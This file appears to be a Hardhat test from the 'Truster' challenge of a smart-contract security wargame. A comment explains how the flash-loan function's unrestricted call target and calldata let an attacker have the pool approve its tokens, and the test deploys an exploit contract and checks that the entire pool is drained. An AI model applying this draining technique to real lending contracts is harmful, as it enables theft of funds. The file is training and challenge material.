const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Truster", function () {
  let deployer, player;
  let token, pool;

  const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();
    pool = await (
      await ethers.getContractFactory("TrusterLenderPool", deployer)
    ).deploy(token.address);
    expect(await pool.token()).to.eq(token.address);

    await token.transfer(pool.address, TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

    expect(await token.balanceOf(player.address)).to.equal(0);
  });

  // The flashLoan method allows us to pass a target address and calldata, there are no restrictions on addresses or calldata values. So we can pass in the token contract and calldata to have them approve their balance to our control. Then after the flashLoan execution finishes, simply call transferFrom to get the funds from the TrustedLenderPool contract
  it("Execution", async function () {
    const ExploitContractFactory = await ethers.getContractFactory(
      "TrusterExploit",
      deployer
    );

    const exploitContract = await ExploitContractFactory.deploy(
      pool.address,
      token.address
    );

    await exploitContract.runExploit(player.address);
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Player has taken all tokens from the pool
    expect(await token.balanceOf(player.address)).to.equal(TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.equal(0);
  });
});
